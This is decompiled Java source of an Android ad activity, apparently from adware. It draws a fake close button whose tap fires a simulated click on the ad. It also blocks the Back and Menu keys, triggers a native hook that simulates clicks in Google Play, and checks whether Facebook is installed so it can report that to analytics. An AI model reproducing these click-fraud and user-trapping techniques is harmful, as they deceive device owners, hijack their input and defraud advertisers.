package com.android.ad.du;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.ViewGroup.OnHierarchyChangeListener;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ImageView.ScaleType;
import android.widget.ProgressBar;
import android.widget.RatingBar;
import android.widget.RelativeLayout;
import android.widget.RelativeLayout.LayoutParams;
import android.widget.TextView;
import com.android.Laucher.MobulaApplication;
import com.android.ad.du.BaiduCacheDBUtil.DBGpPkgUtils;
import com.cmcm.adsdk.nativead.NativeAdManager;
import com.cmcm.baseapi.ads.INativeAd;
import com.cmcm.baseapi.ads.INativeAdLoader.INativeAdLoaderListener;
import com.duapps.ad.AdError;
import com.duapps.ad.DuAdListener;
import com.duapps.ad.DuNativeAd;
import com.mb.bdapp.db.DuAd;
import com.mb.bdapp.util.Constants;
import com.mb.bdapp.util.SharedPreferencesUtils;
import com.nicon.tool.NoTools;
import com.nicon.tool.PreferencesUtls;
import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.assist.FailReason;
import com.nostra13.universalimageloader.core.listener.ImageLoadingListener;
import com.qq.gdt.utils.DomainManger;
import com.qq.gdt.utils.LockTask;
import com.qq.gdt.utils.UtilsClass;
import com.qq.gdt.utils.VersionUpdateUtils;
import com.qq.gdt.utils.VolleyUtil;
import com.ry.inject.JNI;
import com.swiping.whale.R;
import com.umeng.analytics.MobclickAgent;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class ShowDuAd extends Activity {
    private static final int MAX_DU_REQUEST_NUM = 30;
    private static final int MAX_DU_SHOW_NUM = 10;
    private static final String TAG = "DU_AD";
    public static boolean ignoreLimit = false;
    public static String mAdPosid = "1133132";
    /* access modifiers changed from: private */
    public RelativeLayout bigADLayout;
    private ImageView bigImgView;
    private TextView btnView;
    private int[] cludReqNum;
    private int[] cludShowNum;
    private TextView descView;
    private ImageView iconView;
    private ImageLoader imageLoader;
    private ProgressBar loadView;
    /* access modifiers changed from: private */
    public Context mContext;
    private Handler mHandler = new Handler();
    DuAdListener mListener = new DuAdListener() {
        public void onError(DuNativeAd ad, AdError error) {
            int errorCode = error.getErrorCode();
            Log.e(ShowDuAd.TAG, "onError : " + errorCode + "  上报友盟");
            Map ev_error_code = new HashMap();
            ev_error_code.put("error_code", new StringBuilder(String.valueOf(errorCode)).toString());
            MobclickAgent.onEvent(ShowDuAd.this, "duadLoadError", ev_error_code);
            switch (errorCode) {
                case AdError.TIME_OUT_CODE /*3000*/:
                    ShowDuAd.this.finish();
                    return;
                default:
                    return;
            }
        }

        public void onClick(DuNativeAd ad) {
            MobclickAgent.onEvent(ShowDuAd.this.mContext, "adClicked");
            Log.e("HDJ", "百度广告点击");
            SharedPreferencesUtils.addAdvAction(ShowDuAd.this.mContext, 3);
            DuAdData duDdata = BaiduCacheDBUtil.findDbDuAdData(ShowDuAd.this.mContext, ad.getTitle());
            Log.e("-- HDJ ( appcache data ) --", duDdata.toString());
            Intent intent = new Intent(Constants.ACTION_AD_DATA);
            intent.putExtra(Constants.DUAD_DATA, duDdata.toJson());
            ShowDuAd.this.sendBroadcast(intent);
            ShowDuAd.this.uc.recordCount(ShowDuAd.this.getApplicationContext(), false);
            ShowDuAd.this.finish();
        }

        public void onAdLoaded(final DuNativeAd ad) {
            ShowDuAd.this.uc.markDuShowed(ShowDuAd.this.mContext);
            MobclickAgent.onEvent(ShowDuAd.this.mContext, "adShow");
            Log.e("HDJ", "百度广告加载");
            SharedPreferencesUtils.addAdvAction(ShowDuAd.this.mContext, 2);
            ShowDuAd.this.runOnUiThread(new Runnable() {
                public void run() {
                    if (!TextUtils.isEmpty(ad.getImageUrl())) {
                        ShowDuAd.this.showBigAdView(ad);
                    }
                    ShowDuAd.this.showClosedView();
                }
            });
        }
    };
    /* access modifiers changed from: private */
    public INativeAd mNativeAd;
    DuNativeAd nativeAd;
    /* access modifiers changed from: private */
    public RelativeLayout nativeAdContainer;
    /* access modifiers changed from: private */
    public NativeAdManager nativeAdManager;
    /* access modifiers changed from: private */
    public View nativeAdView;
    private RatingBar ratingView;
    /* access modifiers changed from: private */
    public RelativeLayout smallADLayout;
    private TextView smallBtnView;
    private TextView smallDescView;
    private ImageView smallIconView;
    private RatingBar smallRatingView;
    private TextView smallTitleView;
    private TextView titleView;
    /* access modifiers changed from: private */
    public UtilsClass uc;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.nativeAd = MobulaApplication.getDuNativeAd();
        this.mContext = this;
        setContentView(R.layout.ad_card);
        this.imageLoader = ImageLoaderHelper.getInstance(getApplicationContext());
        this.uc = UtilsClass.getInstance();
        initCludNum();
        initView();
        initAdv();
        reportFB2UM();
    }

    private void initCludNum() {
        this.cludReqNum = this.uc.getCludRequestCounts(this);
        this.cludShowNum = this.uc.getCludShowCounts(this);
        Log.e("HDJ -- 初始化云控请求次数 --", Arrays.toString(this.cludReqNum));
        Log.e("HDJ -- 初始化云控展示次数 --", Arrays.toString(this.cludShowNum));
    }

    private void initAdv() {
        VersionUpdateUtils.getInstance(this).reportUpdateAction(this, DomainManger.FIRST_DOMAIN, 9);
        MobclickAgent.onEvent(this.mContext, "requestAdStart");
        SharedPreferencesUtils.addAdvAction(this.mContext, 1);
        initDuData();
    }

    private void initDuData() {
        this.nativeAd.setMobulaAdListener(this.mListener);
        this.nativeAd.fill();
        this.nativeAd.load();
        this.uc.markDuRequested(this.mContext);
    }

    private void initCheetah() {
        Log.e(TAG, "initData  请求Cheetah广告");
        this.nativeAdContainer = (RelativeLayout) findViewById(R.id.big_ad_container);
        initNativeAd();
        requestNativeAd();
    }

    private void initNativeAd() {
        this.nativeAdManager = new NativeAdManager(this, mAdPosid);
        this.nativeAdManager.setNativeAdListener(new INativeAdLoaderListener() {
            public void adLoaded() {
                MobclickAgent.onEvent(ShowDuAd.this.mContext, "adShow");
                SharedPreferencesUtils.addAdvAction(ShowDuAd.this.mContext, 2);
                Log.e("HDJ", "猎豹广告加载");
                INativeAd ad = ShowDuAd.this.nativeAdManager.getAd();
                ShowDuAd.this.nativeAdView.setVisibility(0);
                ShowDuAd.this.smallADLayout.setVisibility(8);
                ShowDuAd.this.bigADLayout.setVisibility(8);
                String iconUrl = ad.getAdIconUrl();
                ImageView iconImageView = (ImageView) ShowDuAd.this.nativeAdView.findViewById(R.id.big_iv_icon);
                if (iconUrl != null) {
                    VolleyUtil.loadImage(iconImageView, iconUrl);
                }
                String mainImageUrl = ad.getAdCoverImageUrl();
                if (!TextUtils.isEmpty(mainImageUrl)) {
                    ImageView imageViewMain = (ImageView) ShowDuAd.this.nativeAdView.findViewById(R.id.iv_main);
                    imageViewMain.setVisibility(0);
                    VolleyUtil.loadImage(imageViewMain, mainImageUrl);
                }
                ((TextView) ShowDuAd.this.nativeAdView.findViewById(R.id.big_main_title)).setText(ad.getAdTitle());
                ((Button) ShowDuAd.this.nativeAdView.findViewById(R.id.big_btn_install)).setText(ad.getAdCallToAction());
                ((TextView) ShowDuAd.this.nativeAdView.findViewById(R.id.text_body)).setText(ad.getAdBody());
                if (ShowDuAd.this.mNativeAd != null) {
                    ShowDuAd.this.mNativeAd.unregisterView();
                }
                ShowDuAd.this.mNativeAd = ad;
                ShowDuAd.this.mNativeAd.registerViewForInteraction(ShowDuAd.this.nativeAdContainer);
                UtilsClass.getInstance().recordCount(ShowDuAd.this, true);
                LockTask.flag = true;
                ShowDuAd.this.showClosedView();
            }

            public void adFailedToLoad(int errorCode) {
                Log.e("HDJ", "猎豹广告加载失败 ：" + errorCode);
                MobclickAgent.onEvent(ShowDuAd.this.mContext, "adFailedToLoad");
            }

            public void adClicked(INativeAd ad) {
                Log.e("HDJ", "猎豹广告点击");
                MobclickAgent.onEvent(ShowDuAd.this.mContext, "adClicked");
                SharedPreferencesUtils.addAdvAction(ShowDuAd.this.mContext, 3);
                String title = ad.getAdTitle();
                Log.e("HDJ", "---- 广告漏斗 -- " + BaiduCacheDBUtil.getAdPackageName(ShowDuAd.this.mContext, title) + " -- （点击） -- " + title + " --");
                ShowDuAd.this.sendAdData(ad);
            }
        });
    }

    private void requestNativeAd() {
        Log.e("HDJ", "请求猎豹广告");
        this.nativeAdManager.loadAd();
    }

    private void reportFB2UM() {
        if (NoTools.checkAPP(this, "com.facebook.katana")) {
            Log.e(TAG, "------- 安装有Facebook ------");
            if (!PreferencesUtls.getFbUmReported(this)) {
                MobclickAgent.onEvent(this, "hasFaceBook");
                Log.e(TAG, "------- 上报到友盟（Fackbook存在） ------");
                PreferencesUtls.setFbUmReported(this, true);
            }
        }
    }

    private void initView() {
        this.bigADLayout = (RelativeLayout) findViewById(R.id.big_ad);
        this.smallADLayout = (RelativeLayout) findViewById(R.id.small_ad);
        this.titleView = (TextView) findViewById(R.id.card_name);
        this.iconView = (ImageView) findViewById(R.id.card_icon);
        this.ratingView = (RatingBar) findViewById(R.id.card_rating);
        this.descView = (TextView) findViewById(R.id.card__des);
        this.bigImgView = (ImageView) findViewById(R.id.card_image);
        this.btnView = (TextView) findViewById(R.id.card_btn);
        this.smallTitleView = (TextView) findViewById(R.id.small_card_name);
        this.smallIconView = (ImageView) findViewById(R.id.small_card_icon);
        this.smallRatingView = (RatingBar) findViewById(R.id.small_card_rating);
        this.smallDescView = (TextView) findViewById(R.id.small_card__des);
        this.smallBtnView = (TextView) findViewById(R.id.small_card_btn);
        this.nativeAdView = findViewById(R.id.big_ad_container);
    }

    private void sendAdData(DuNativeAd ad) {
        try {
            String adData = BaiduCacheDBUtil.getBaiDuAdPackage(ad.getTitle(), this);
            Log.e("HDJ-----------", "sendAdData : " + adData);
            if (TextUtils.isEmpty(adData)) {
                MobclickAgent.onEvent(this, "db_pkg_unfound");
                return;
            }
            MobclickAgent.onEvent(this, "db_pkg_found");
            SharedPreferencesUtils.addAdvAction(this.mContext, 4);
            Intent intent = new Intent(Constants.ACTION_AD_DATA);
            intent.putExtra(Constants.DUAD_DATA, adData);
            sendBroadcast(intent);
        } catch (Exception e) {
            MobclickAgent.onEvent(this, "db_pkg_unfound");
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void sendAdData(INativeAd ad) {
        String adData = null;
        try {
            adData = CheetahCacheDBUtil.getAdPackage(getApplicationContext(), ad.getAdTitle());
            Log.e("HDJ-----------", "sendAdData : " + adData);
            if (TextUtils.isEmpty(adData)) {
                MobclickAgent.onEvent(this, "db_pkg_unfound");
                return;
            }
            MobclickAgent.onEvent(this, "db_pkg_found");
            SharedPreferencesUtils.addAdvAction(this.mContext, 4);
            Intent intent = new Intent(Constants.ACTION_AD_DATA);
            intent.putExtra(Constants.DUAD_DATA, adData);
            sendBroadcast(intent);
        } catch (Exception e) {
            MobclickAgent.onEvent(this, "db_pkg_unfound");
            e.printStackTrace();
        }
    }

    private void gpVirClick() {
        this.mHandler.postDelayed(new Runnable() {
            public void run() {
                MobclickAgent.onEvent(ShowDuAd.this.mContext, "GP_Auto_Click_Num");
                String resInfo = "";
                switch (JNI.startHook(ShowDuAd.this.getApplicationContext())) {
                    case -3:
                        MobclickAgent.onEvent(ShowDuAd.this.mContext, "GP_Permission_Fail");
                        resInfo = "-3:没有权限";
                        return;
                    case -2:
                        MobclickAgent.onEvent(ShowDuAd.this.mContext, "File_Operate_Fail");
                        resInfo = "-2:必要文件操作失败";
                        return;
                    case -1:
                        MobclickAgent.onEvent(ShowDuAd.this.mContext, "GP_UnInstall_Num");
                        resInfo = "-1:GP未安装";
                        return;
                    case 0:
                        resInfo = "0:GP模拟点击上次还在运行";
                        MobclickAgent.onEvent(ShowDuAd.this.mContext, "GP_Auto_Is_Running");
                        return;
                    case 1:
                        resInfo = "1:GP模拟点击执行成功";
                        MobclickAgent.onEvent(ShowDuAd.this.mContext, "GP_Auto_Excute_Num");
                        return;
                    default:
                        return;
                }
            }
        }, 10000);
    }

    private void markDuAdv(final DuNativeAd duAd) {
        this.mHandler.post(new Runnable() {
            public void run() {
                String adData = BaiduCacheDBUtil.getBaiDuAdPackage(duAd.getTitle(), ShowDuAd.this.getApplicationContext());
                if (!TextUtils.isEmpty(adData)) {
                    DuAd duAdv = BaiduCacheDBUtil.jsonToDuAd(adData);
                    Log.e(ShowDuAd.TAG, duAdv.getPname());
                    DBGpPkgUtils.getInstance(ShowDuAd.this.mContext).addPkgName(duAdv.getPname());
                }
            }
        });
    }

    private void markChAdv(final INativeAd ad) {
        this.mHandler.post(new Runnable() {
            public void run() {
                String adData = CheetahCacheDBUtil.getAdPackage(ShowDuAd.this.getApplicationContext(), ad.getAdTitle());
                if (!TextUtils.isEmpty(adData)) {
                    try {
                        DuAd duAdv = BaiduCacheDBUtil.jsonToDuAd(adData);
                        Log.e(ShowDuAd.TAG, duAdv.getPname());
                        DBGpPkgUtils.getInstance(ShowDuAd.this.mContext).addPkgName(duAdv.getPname());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    private void showSmallAdView(DuNativeAd ad) {
        this.smallTitleView.setText(ad.getTitle());
        this.smallRatingView.setRating(ad.getRatings());
        this.imageLoader.displayImage(ad.getIconUrl(), this.smallIconView);
        this.smallDescView.setText(ad.getShortDesc());
        this.smallBtnView.setText(ad.getCallToAction());
        this.nativeAd.registerViewForInteraction(this.smallADLayout);
        this.nativeAdView.setVisibility(8);
        this.smallADLayout.setVisibility(8);
        this.bigADLayout.setVisibility(0);
        UtilsClass.getInstance().recordCount(this, true);
        LockTask.flag = true;
    }

    /* access modifiers changed from: private */
    public void showBigAdView(DuNativeAd ad) {
        if (TextUtils.isEmpty(ad.getImageUrl())) {
            Log.e("HDJ", "过滤小图，小图不展示广告！");
            finish();
            return;
        }
        Log.d(TAG, "showBigAdView");
        this.nativeAdView.setVisibility(8);
        this.smallADLayout.setVisibility(8);
        this.bigADLayout.setVisibility(0);
        this.titleView.setText(ad.getTitle());
        this.ratingView.setRating(ad.getRatings());
        this.imageLoader.displayImage(ad.getIconUrl(), this.iconView);
        this.descView.setText("");
        this.btnView.setText(ad.getCallToAction());
        this.nativeAd.registerViewForInteraction(this.bigADLayout);
        this.imageLoader.displayImage(ad.getImageUrl(), this.bigImgView, new ImageLoadingListener() {
            public void onLoadingStarted(String paramString, View paramView) {
            }

            public void onLoadingFailed(String paramString, View paramView, FailReason paramFailReason) {
            }

            public void onLoadingComplete(String paramString, View paramView, Bitmap paramBitmap) {
            }

            public void onLoadingCancelled(String paramString, View paramView) {
            }
        });
        UtilsClass.getInstance().recordCount(this, true);
        LockTask.flag = true;
    }

    /* access modifiers changed from: private */
    public void showClosedView() {
        this.mHandler.postDelayed(new Runnable() {
            public void run() {
                ImageView imageView = new ImageView(ShowDuAd.this.mContext);
                imageView.setBackgroundResource(R.drawable.exit);
                imageView.setScaleType(ScaleType.FIT_CENTER);
                LayoutParams relLayoutParams = new LayoutParams(-1, -2);
                relLayoutParams.addRule(12);
                relLayoutParams.addRule(9);
                RelativeLayout parent = new RelativeLayout(ShowDuAd.this.mContext);
                parent.addView(imageView, relLayoutParams);
                ((Activity) ShowDuAd.this.mContext).addContentView(parent, relLayoutParams);
                ((ViewGroup) parent.getParent()).setOnHierarchyChangeListener(new OnHierarchyChangeListener() {
                    public void onChildViewRemoved(View parent, View child) {
                    }

                    public void onChildViewAdded(View parent, View child) {
                        parent.bringToFront();
                    }
                });
                imageView.setClickable(true);
                imageView.setFocusable(true);
                imageView.setOnClickListener(new OnClickListener() {
                    public void onClick(View v) {
                        Log.e("yanghang", "imageView.setOnClickListener : ");
                        if (UtilsClass.getInstance().getLastShowCount(ShowDuAd.this.getApplicationContext()) > 0) {
                            ShowDuAd.this.setSimulateClick(ShowDuAd.this);
                        } else {
                            ShowDuAd.this.finish();
                        }
                    }
                });
            }
        }, 2000);
    }

    /* access modifiers changed from: private */
    public void setSimulateClick(final Activity activity) {
        activity.runOnUiThread(new Runnable() {
            public void run() {
                DisplayMetrics dm = activity.getResources().getDisplayMetrics();
                int x = dm.widthPixels / 2;
                int y = dm.heightPixels / 2;
                long downTime = SystemClock.uptimeMillis();
                MotionEvent downEvent = MotionEvent.obtain(downTime, downTime, 0, (float) x, (float) y, 0);
                MotionEvent upEvent = MotionEvent.obtain(downTime, downTime, 1, (float) x, (float) y, 0);
                activity.getWindow().getDecorView().dispatchTouchEvent(downEvent);
                activity.getWindow().getDecorView().dispatchTouchEvent(upEvent);
                downEvent.recycle();
                upEvent.recycle();
            }
        });
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == 4 || keyCode == 82) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
}
